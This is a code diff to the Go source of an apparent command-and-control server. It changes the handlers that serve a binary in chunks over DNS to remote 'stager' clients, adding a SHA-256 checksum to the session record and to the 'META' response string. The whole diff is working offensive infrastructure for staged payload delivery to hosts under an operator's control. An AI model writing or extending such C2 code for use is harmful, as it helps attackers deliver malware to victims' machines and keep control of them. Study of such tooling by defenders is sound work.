@@ -113,6 +113,7 @@ type CachedStagerSession struct {
 	StagerIP        string
 	TotalChunks     int
 	ChunksServed    int
+	SHA256Checksum  string // Checksum of original binary for verification
 	CreatedAt       time.Time
 	LastActivity    time.Time
 }
@@ -1733,8 +1734,8 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 		for sessionID, session := range c2.cachedStagerSessions {
 			if session.StagerIP == stagerIP {
 				c2.mutex.RUnlock()
-				// Return existing session's META response
-				metaResponse := fmt.Sprintf("META|%s|%d", sessionID, session.TotalChunks)
+				// Return existing session's META response with checksum
+				metaResponse := fmt.Sprintf("META|%s|%d|%s", sessionID, session.TotalChunks, session.SHA256Checksum)
 				if !isDuplicate {
 					logf("[C2] Using existing session %s for stager %s", sessionID, stagerIP)
 				}
@@ -1808,8 +1809,9 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 						}
 					}()
 
-					// Return META immediately (fast DNS response!)
-					metaResponse := fmt.Sprintf("META|%s|%d", sessionID, chunkCount)
+					// Return META immediately (fast DNS response!) with checksum
+					// Checksum will be populated when session is fully synced with Master
+					metaResponse := fmt.Sprintf("META|%s|%d|%s", sessionID, chunkCount, c2.cachedStagerSessions[sessionID].SHA256Checksum)
 					if !isDuplicate {
 						logf("[C2] Returning META response from cache: %s (len=%d)", metaResponse, len(metaResponse))
 					}
@@ -2070,9 +2072,10 @@ func (c2 *C2Manager) handleStandaloneStagerRequest(stagerIP, stagerOS, stagerArc
 		logf("[C2] Stager session created: %s (%d chunks in standalone mode)", sessionID, len(chunks))
 	}
 
-	// Return metadata with session ID and chunk count (matching distributed mode format)
-	// Format: META|<session_id>|<total_chunks>
-	return fmt.Sprintf("META|%s|%d", sessionID, len(chunks))
+	// Return metadata with session ID, chunk count, and checksum (matching distributed mode format)
+	// Format: META|<session_id>|<total_chunks>|<sha256_checksum>
+	// Checksum is empty in standalone mode (no Master database access)
+	return fmt.Sprintf("META|%s|%d|", sessionID, len(chunks))
 }
 
 // handleStagerAck processes a stager acknowledgment for chunk delivery
